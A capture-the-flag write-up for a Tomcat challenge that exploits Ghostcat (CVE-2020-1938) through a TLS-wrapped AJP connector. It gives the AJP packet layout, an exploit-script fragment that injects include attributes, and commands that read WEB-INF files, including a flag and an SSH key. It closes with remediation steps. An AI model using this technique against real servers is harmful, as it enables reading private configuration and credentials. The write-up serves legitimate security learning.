# Tom Wants Peace - 1 — Full Writeup

**Category:** Web / Infra (Java, Apache Tomcat)
**Difficulty:** 10 points
**Targets:**
- `http://kicyber-7d535cb35083-tomwantspeace1-0-0.chals.io` — Tomcat HTTP connector
- `http://kicyber-7d535cb35083-tomwantspeace1-0-1.chals.io` — Tomcat **AJP** connector (TLS-wrapped)

**Goal:** Recover the flag from the Tomcat deployment.

---

## TL;DR

The second endpoint is not a web server at all: it is the **Apache Tomcat AJP
connector (default port 8009) wrapped in TLS**. The server runs **Tomcat
8.5.50**, which is vulnerable to **Ghostcat / CVE-2020-1938** (fixed in
8.5.51). Speaking AJP with a forged `ForwardRequest` lets us inject
`javax.servlet.include.*` request attributes and make Tomcat serve arbitrary
files from inside the web application.

Reading `WEB-INF/web.xml` leaked a developer TODO pointing at two leftover
deployment artifacts, and reading them gave the flag plus an SSH private key.

**Flag:**

```
KPMG_CTF{X7gQ_GADftheRC9dwRI25mmW9Z8S6K_Zvah1ndwd8WWX}
```

| Artifact | Path | Value |
|---|---|---|
| Flag | `/WEB-INF/flag.txt` | `KPMG_CTF{X7gQ_GADftheRC9dwRI25mmW9Z8S6K_Zvah1ndwd8WWX}` |
| SSH user | `/WEB-INF/flag.txt` | `Ross` |
| SSH private key | `/WEB-INF/id_rsa` | `appadmin@internal` (used by Part 2) |

---

## 1. Reconnaissance — two ports, two different beasts

Both hostnames resolve to the same pair of front-end IPs and both sit behind a
`*.chals.io` TLS reverse proxy. Probing the HTTP side (`-0-0`) reveals a
default **Apache Tomcat/8.5.50** installation:

```
$ curl -s http://kicyber-...-tomwantspeace1-0-0.chals.io/ | grep -i title
<title>Apache Tomcat/8.5.50</title>
```

The second endpoint (`-0-1`) answers on `:443` with a valid `*.chals.io`
certificate but **never returns an HTTP response** — the TLS session is
established and then the peer just goes quiet / closes. That is the signature of
a non-HTTP service being tunnelled through the same TLS gateway.

### Confirming AJP

AJP is a binary protocol. Its client→server magic is `0x1234`; a `CPING`
(code `0x0A`) must be answered with a `CPONG` (code `0x09`) using the
server→client magic `0x4142` ("AB"). Sending `12 34 00 01 0A` over TLS to
`-0-1:443` returns:

```
resp: 4142000109     # magic "AB", len=1, code=9  => CPONG  ✅ it's AJP
```

So: `-0-1` is the Tomcat AJP connector, reachable over TLS on port 443.

Version 8.5.50 was released **before** the Ghostcat fix (8.5.51), and the AJP
connector has no `secret` configured (no 403 returned), so it is exploitable.

---

## 2. Understanding Ghostcat (CVE-2020-1938)

Tomcat's AJP connector is meant to be reached *only* by a trusted reverse proxy
(Apache httpd `mod_proxy_ajp`/`mod_jk`) over the internal network. Because it
implicitly trusts its caller, a request can carry arbitrary **request
attributes**. The servlet spec allows two special attributes that the
`DefaultServlet` uses to dispatch to an arbitrary resource:

| Attribute | Meaning |
|---|---|
| `javax.servlet.include.request_uri` | the include target URI |
| `javax.servlet.include.servlet_path` | the servlet path |
| `javax.servlet.include.path_info`   | the **file to include** |

By setting these via AJP we force Tomcat to include any file readable by the
Tomcat process — including files under `WEB-INF/`, which are never served over
HTTP.

---

## 3. Speaking AJP correctly (the fiddly part)

A raw AJP13 `ForwardRequest` (code `0x02`) has this layout:

```
0x1234 | length(2) | 0x02 |
  method            : 1 byte CODE  (GET = 2, POST = 3, ...; 0xFF => stored string)
  protocol          : string
  req_uri           : string
  remote_addr       : string
  remote_host       : string
  local_name        : string
  local_port        : 2 bytes
  is_ssl            : 1 byte
  num_headers       : 2 bytes
  headers[]         : (name string | 0xA0xx code) + value string
  attributes[]      : ATTRIBUTE-CODE packets, terminated by 0xFF
```

Three gotchas that cost most of the debugging time:

1. **Method is a single byte code**, not a string (`Constants.getMethodForCode(methodCode - 1)`).
2. **AJP strings are NUL-terminated**: `[len:2][bytes][0x00]`
   (`AjpMessage.doGetBytes(..., terminated=true)` does `pos++` to skip the NUL).
   Without the NUL, every subsequent length pointer drifts and Tomcat dies with
   `ArrayIndexOutOfBoundsException: Requested read of bytes at position N ...`.
3. **Extra attributes are not counted** — each is a packet beginning with an
   attribute *code*, and the list ends with `0xFF` (`SC_A_ARE_DONE`). To set an
   arbitrary request attribute use code **`0x0A` (`SC_A_REQ_ATTRIBUTE`)**
   followed by `name` + `value`, each as a NUL-terminated AJP string.

> The crash dumps returned by Tomcat during development
> (`AjpProcessor.prepareRequest` line numbers, `Constants.getMethodForCode`)
> were an excellent oracle for getting the encoding byte-perfect.

### Exploit script — `TomWantsPeace1/ajp_ghost.py`

```python
pkt = b"\x12\x34" + struct.pack(">H", len(body)) + body
attributes = [
    ("javax.servlet.include.request_uri", "/"),
    ("javax.servlet.include.path_info",   "/WEB-INF/web.xml"),
    ("javax.servlet.include.servlet_path", "/"),
]
```

Run:

```bash
python3 ajp_ghost.py read /WEB-INF/web.xml
```

---

## 4. Exploitation

### 4.1 Read `WEB-INF/web.xml`

```
$ python3 ajp_ghost.py read /WEB-INF/web.xml
status=200
<?xml version="1.0" encoding="UTF-8"?>
<web-app ...>
    <!-- TODO: remove deployment artifacts before prod (flag.txt, id_rsa) — Ross -->
</web-app>
```

A classic developer TODO. Two files are named directly.

### 4.2 Read the flag

```
$ python3 ajp_ghost.py read /WEB-INF/flag.txt
Flag: KPMG_CTF{X7gQ_GADftheRC9dwRI25mmW9Z8S6K_Zvah1ndwd8WWX}
SSH User: Ross
```

### 4.3 Read the deployment key (bonus / Part-2 pivot)

```
$ python3 ajp_ghost.py read /WEB-INF/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...appadmin@internal...
-----END OPENSSH PRIVATE KEY-----
```

The key comment is `appadmin@internal` and the flag file says the SSH user is
`Ross` — clearly the entry point for **Tom Wants Peace - 2**.

---

## 5. Why it works / impact

- **CVE-2020-1938 (Ghostcat)** — the AJP connector trusts any client and lets it
  set `javax.servlet.include.*` attributes. Effect: **arbitrary file read** of
  anything the Tomcat user can read (`WEB-INF/web.xml`, configs, keys,
  `WEB-INF/classes/**`, `tomcat-users.xml`, `/proc/self/environ`, ...).
- Exposing the AJP port to the internet (and here even wrapping it in TLS to
  make it look "safe") removes the entire trust boundary the protocol assumes.
- If the application has a file-upload feature, Ghostcat upgrades to
  **remote code execution** by uploading a JSP then including it. (Not needed
  here — the flag was a plain file.)

## 6. Remediation

1. **Never expose the AJP connector** outside the internal network
   (`address="127.0.0.1"` or firewall port 8009).
2. Upgrade Tomcat — **8.5.51+ / 9.0.31+** contain the Ghostcat fix.
3. Set a strong AJP `secret` / `requiredSecret` on the `<Connector>` so forged
   requests are rejected with 403.
4. Remove deployment artifacts (`flag.txt`, `id_rsa`) from the web root.

---

## 7. Reproducing

```bash
# 1. confirm AJP over TLS
python3 - <<'PY'
import socket, ssl
s = ssl._create_unverified_context().wrap_socket(
    socket.create_connection(("kicyber-7d535cb35083-tomwantspeace1-0-1.chals.io", 443)),
    server_hostname="kicyber-7d535cb35083-tomwantspeace1-0-1.chals.io")
s.sendall(bytes.fromhex("123400010A"))
print(s.recv(16).hex())   # -> 4142000109  (CPONG)
PY

# 2. Ghostcat file read
cd TomWantsPeace1
python3 ajp_ghost.py read /WEB-INF/web.xml
python3 ajp_ghost.py read /WEB-INF/flag.txt
python3 ajp_ghost.py read /WEB-INF/id_rsa
```

## 8. Artifacts in this folder

| File | Description |
|---|---|
| `ajp_ghost.py`  | Ghostcat (CVE-2020-1938) exploit over TLS-AJP |
| `web.xml`       | Dumped `/WEB-INF/web.xml` (contains the TODO hint) |
| `flag.txt`      | Dumped `/WEB-INF/flag.txt` (contains the flag) |
| `id_rsa`        | Dumped `/WEB-INF/id_rsa` (`appadmin@internal`) |
| `flag.txt.raw`  | Raw byte-for-byte capture of the flag response |
